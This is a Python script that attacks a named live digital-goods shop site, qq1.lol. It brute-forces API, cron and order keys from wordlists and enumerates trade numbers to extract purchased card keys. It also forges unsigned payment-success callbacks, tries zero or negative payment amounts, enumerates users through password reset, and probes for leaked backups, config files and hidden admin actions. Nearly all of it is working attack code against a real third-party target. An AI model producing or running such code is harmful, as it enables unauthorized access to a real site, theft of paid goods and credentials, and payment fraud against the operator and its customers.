#!/usr/bin/env python3
"""qq1.lol alternative attack vectors — syskey/skey, cross-site keys, getshop, install, cron, hidden acts"""
import hashlib
import json
import os
import re
import subprocess
import time
from datetime import datetime, timedelta
from pathlib import Path
from urllib.parse import quote

BASE = "https://qq1.lol"
OUT = Path(os.environ.get("QQ1_OUT", "/data/automation/results/qq1.lol"))
OUT.mkdir(parents=True, exist_ok=True)
LOG = OUT / "alt_probe.log"
HITS = OUT / "alt_hits.jsonl"
JAR = str(OUT / ".alt_cookies")
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
TIMEOUT = os.environ.get("QQ1_TIMEOUT", "12")

# ecosystem keys / syskey candidates
CROSS_KEYS = [
    "kln166", "KLN166", "kulinan", "fffzz", "fffzzlol", "hmjf", "htqq", "qw123",
    "qq1", "buyi", "buyiq", "qqkqq", "QQKZC", "mckuai", "rainbow", "faka",
    "syskey", "sys_key", "jiankong", "cron", "ka1", "ka1.one", "830603",
    "123456", "admin", "secret", "authkey", "epay", "paykey", "merchant",
    "qq1.lol", "qq1lol", "布衣", "tianyu", "tianyu9080",
]
SYSKEY_WORDS = list(dict.fromkeys(CROSS_KEYS + [
    "qq1lol", "buyi666", "buyi888", "buyi123", "qqkzc", "Lxsj@123", "ruoyi123",
    "888888", "666666", "abcdef", "password", "root", "test", "api", "key",
]))


def log(msg):
    line = f"[{datetime.now():%H:%M:%S}] {msg}"
    print(line, flush=True)
    with open(LOG, "a") as f:
        f.write(line + "\n")


def hit(kind, detail, body=""):
    rec = {"ts": datetime.now().isoformat(), "kind": kind, "detail": detail, "body": (body or "")[:3000]}
    with open(HITS, "a") as f:
        f.write(json.dumps(rec, ensure_ascii=False) + "\n")
    log(f"*** HIT [{kind}] {detail}: {(body or '')[:200]}")


def curl(url, method="GET", post=None, extra=None):
    cmd = ["curl", "-sk", f"--max-time={TIMEOUT}", "-b", JAR, "-c", JAR,
           "-A", UA, "-H", f"Referer: {BASE}/", "-H", "X-Requested-With: XMLHttpRequest"]
    if extra:
        for h in extra:
            cmd += ["-H", h]
    if method == "POST":
        cmd += ["-X", "POST", "-H", "Content-Type: application/x-www-form-urlencoded"]
        if post:
            cmd += ["-d", post]
    cmd.append(url)
    try:
        return subprocess.run(cmd, capture_output=True, text=True, timeout=int(TIMEOUT) + 5).stdout.strip()
    except Exception as e:
        return f"err:{e}"


def get_csrf(page="/"):
    body = curl(f"{BASE}{page}")
    m = re.search(r'csrf_token\s*=\s*"([a-f0-9]+)"', body)
    return m.group(1) if m else ""


def is_kami(body):
    if not body or len(body) < 10:
        return False
    markers = ("kminfo", "卡密", "----", "账号", "密码", '"code":0')
    bad = ("验证失败", "请提供", "No Act", "code\":-1", "code\":403", "code\":-5")
    return any(m in body for m in markers) and not any(b in body for b in bad)


# --- 1. Cross-site API keys on %61pi.php ---
def test_cross_api_keys():
    log("=== [1] Cross-site API keys on %61pi.php ===")
    curl(BASE + "/")
    for key in CROSS_KEYS:
        for param in ("key", "api_key", "token"):
            body = curl(f"{BASE}/%61pi.php?act=search&id=1&{param}={quote(key)}")
            if is_kami(body) or ('"code":0' in body and "密钥" not in body):
                hit("cross_api_key", f"{param}={key}", body)
                return
    # batch search ids 25910-25915 with top keys
    for key in CROSS_KEYS[:15]:
        for oid in (25915, 25914, 1, 100):
            body = curl(f"{BASE}/%61pi.php?act=search&id={oid}&key={quote(key)}")
            if is_kami(body):
                hit("cross_api_dump", f"id={oid} key={key}", body)
                return


# --- 2. SYS_KEY skey = md5(id+key+id) ---
def test_syskey_skey():
    log("=== [2] SYS_KEY skey brute md5(id+key+id) ===")
    csrf = get_csrf("/?mod=query")
    oids = list(range(25900, 25916)) + [1, 100, 1000, 5000]
    for oid in oids:
        for key in SYSKEY_WORDS:
            sk = hashlib.md5(f"{oid}{key}{oid}".encode()).hexdigest()
            body = curl(f"{BASE}/ajax.php?act=order", "POST", f"id={oid}&skey={sk}&csrf_token={csrf}")
            if is_kami(body):
                hit("syskey_skey", f"oid={oid} key={key} skey={sk}", body)
                return
        # qw123-style weak skeys
        for sk in (str(oid), "test", "qq1", "buyi", "admin", "123456", hashlib.md5(str(oid).encode()).hexdigest()):
            body = curl(f"{BASE}/ajax.php?act=order", "POST", f"id={oid}&skey={sk}&csrf_token={csrf}")
            if is_kami(body):
                hit("weak_skey", f"oid={oid} skey={sk}", body)
                return


# --- 3. getshop / submit / pay callbacks ---
def test_getshop_submit():
    log("=== [3] getshop.php + submit.php + notify bypass ===")
    paths = [
        "getshop.php", "other/getshop.php", "shop/getshop.php",
        "user/getshop.php", "pay/getshop.php",
    ]
    for p in paths:
        body = curl(f"{BASE}/{p}")
        if body and "404" not in body[:80] and len(body) > 20:
            log(f"  {p}: {body[:100]}")
    # trade_no windows
    now = datetime.now()
    for h in range(72):
        t = now - timedelta(hours=h)
        for suf in ("146", "001", "000"):
            tn = t.strftime("%Y%m%d%H%M%S") + suf
            for ep in (
                f"getshop.php?trade_no={tn}",
                f"other/getshop.php?trade_no={tn}",
                f"getshop.php?id={tn}",
                f"?mod=order&orderid={tn}",
            ):
                body = curl(f"{BASE}/{ep}")
                if is_kami(body) or ('"code":0' in body and "trade" in body.lower()):
                    hit("getshop_trade", ep, body)
                    return
        if h % 12 == 0:
            log(f"  trade_no scanned ~{h}h")
    # notify without sign
    tn = os.environ.get("QQ1_TRADE_NO", "20260720145603146")
    for ep in ("other/epay_notify.php", "other/alipay_notify.php", "other/wxpay_notify.php", "other/qqpay_notify.php"):
        for post in (
            f"trade_no={tn}&trade_status=TRADE_SUCCESS&money=99",
            f"out_trade_no={tn}&status=1",
            f"orderid={tn}&status=1",
        ):
            body = curl(f"{BASE}/{ep}", "POST", post)
            if body and body.lower() in ("ok", "success", "success\n") or "success" in body.lower():
                hit("notify_bypass", f"{ep} {post[:60]}", body)


# --- 4. install / cron / findpwd ---
def test_install_cron_findpwd():
    log("=== [4] install + cron + findpwd ===")
    for p in ("install/", "install/index.php", "install/step2.php", "install/step3.php"):
        body = curl(f"{BASE}/{p}")
        if body and len(body) > 50 and "安装" in body:
            hit("install_accessible", p, body[:500])
    cron_keys = SYSKEY_WORDS + ["qq1lol", "buyi2024", "buyi2025", "buyi2026", "monitor", "task", "job"]
    for k in cron_keys:
        for param in ("key", "cronkey", "token", "pwd"):
            body = curl(f"{BASE}/cron.php?{param}={quote(k)}")
            if body and "监控密钥不正确" not in body and "密钥" not in body and len(body) > 5:
                hit("cron_key", f"{param}={k}", body)
    # findpwd user enum
    for user in ("admin", "buyi", "buyiq", "test", "qq1", "root"):
        for ep in ("user/findpwd.php", "sup/findpwd.php"):
            body = curl(f"{BASE}/{ep}", "POST", f"user={user}&type=email")
            if body and ("不存在" not in body and "未注册" not in body) and len(body) > 30:
                log(f"  findpwd {ep} user={user}: {body[:100]}")


# --- 5. Hidden ajax / user/sup actions ---
def test_hidden_actions():
    log("=== [5] Hidden ajax actions ===")
    acts = [
        "rev_api_orders_dump", "export", "dump", "backup", "download", "sendcard",
        "getcard", "cardlist", "kami", "faka", "send", "orderlist", "getorder",
        "getlogs", "toollogs", "getmoney", "siteinfo", "getconfig", "getsite",
        "getuser", "userlist", "memberlist", "reset", "update", "install",
        "quickreg", "connect", "oauth", "qqlogin", "wxlogin", "gift_start",
        "coupon", "cutshop", "groupshop", "seckill", "recharge", "withdraw",
    ]
    for act in acts:
        for ep in ("ajax.php", "user/ajax.php", "sup/ajax.php", "%61pi.php"):
            body = curl(f"{BASE}/{ep}?act={act}", "POST", "page=1&limit=100&id=1")
            if body and len(body) > 30 and "No Act" not in body and "请提供" not in body:
                if '"code":0' in body or is_kami(body):
                    hit("hidden_act", f"{ep}?act={act}", body)


# --- 6. Gift / free pay / coupon ---
def test_free_paths():
    log("=== [6] Free pay / gift / coupon ===")
    csrf = get_csrf("/?mod=buy&cid=14&tid=131")
    for act in ("gift_start", "coupon", "cutshop", "groupshop", "seckill"):
        body = curl(f"{BASE}/ajax.php?act={act}", "POST", f"tid=131&csrf_token={csrf}")
        if body and '"code":0' in body:
            hit("free_act", act, body)
    for money in ("0", "0.01", "-1", "0.001"):
        body = curl(f"{BASE}/ajax.php?act=pay", "POST",
                    f"tid=131&num=1&money={money}&inputvalue=13800138000&csrf_token={csrf}")
        if body and '"code":0' in body:
            hit("free_pay", f"money={money}", body)


# --- 7. Subdomains + path variants ---
def test_subdomains():
    log("=== [7] Subdomains ===")
    subs = ["www", "api", "shop", "admin", "sup", "pay", "m", "wap", "fenzhan", "user", "q8", "qq0"]
    for sub in subs:
        host = f"{sub}.qq1.lol" if sub not in ("q8",) else f"{sub}.qq0.lol"
        body = curl(f"https://{host}/ajax.php?act=getcount")
        if body and '"code":0' in body:
            hit("subdomain_leak", host, body)
        body2 = curl(f"https://{host}/%61pi.php?act=search&id=1&key=qq1")
        if is_kami(body2):
            hit("subdomain_api", host, body2)


# --- 8. File leaks round 2 ---
def test_file_leaks2():
    log("=== [8] Extended file leaks ===")
    paths = [
        "qq1.zip", "qq1.lol.zip", "wwwroot.zip", "web.zip", "bak.zip",
        "database.sql", "dump.sql", "sql.sql", "db_backup.sql",
        ".git/HEAD", ".git/config", ".svn/wc.db",
        "runtime/log/single.log", "runtime/log/error.log",
        "application/database.php", "config/database.php",
        "assets/faka/config.php", "includes/common.php",
        "admin.php", "manage.php", "htgl.php", "shequ.php",
        "api.php.bak", "ajax.php.bak", "config.php.old",
        "user.php", "order.php", "pay.php", "notify.php",
        ".user.ini", "php.ini", ".htaccess",
    ]
    for p in paths:
        body, *_ = (curl(f"{BASE}/{p}"),)
        if not body:
            continue
        if any(x in body for x in ("<?php", "DB_", "password", "mysql", "root:", "[core]")):
            hit("file_leak", p, body[:500])
        elif body.startswith("PK") or "CREATE TABLE" in body:
            hit("file_leak_binary", p, f"len={len(body)}")


# --- 9. OAuth / QR / connect ---
def test_oauth_qr():
    log("=== [9] OAuth / QR login ===")
    for ep in (
        "user/connect.php?type=qq",
        "user/qrlogin.php?do=getqrpic",
        "sup/qrlogin.php?do=getqrpic",
        "user/ajax.php?act=connect",
        "user/ajax.php?act=quickreg",
    ):
        body = curl(f"{BASE}/{ep}")
        if body and ("qrcode" in body.lower() or "qr" in body.lower() or '"code":0' in body):
            log(f"  {ep}: {body[:120]}")
    # open redirect
    for url in ("https://evil.com", "//evil.com", "javascript:alert(1)"):
        body = curl(f"{BASE}/user/connect.php?type=qq&redirect={quote(url)}")
        if "evil.com" in body:
            hit("open_redirect", url, body[:300])


def main():
    log("=== qq1.lol ALT PROBE START ===")
    curl(BASE + "/")
    test_cross_api_keys()
    test_syskey_skey()
    test_getshop_submit()
    test_install_cron_findpwd()
    test_hidden_actions()
    test_free_paths()
    test_subdomains()
    test_file_leaks2()
    test_oauth_qr()
    log(f"=== ALT PROBE DONE hits={sum(1 for _ in open(HITS)) if HITS.exists() else 0} ===")


if __name__ == "__main__":
    main()
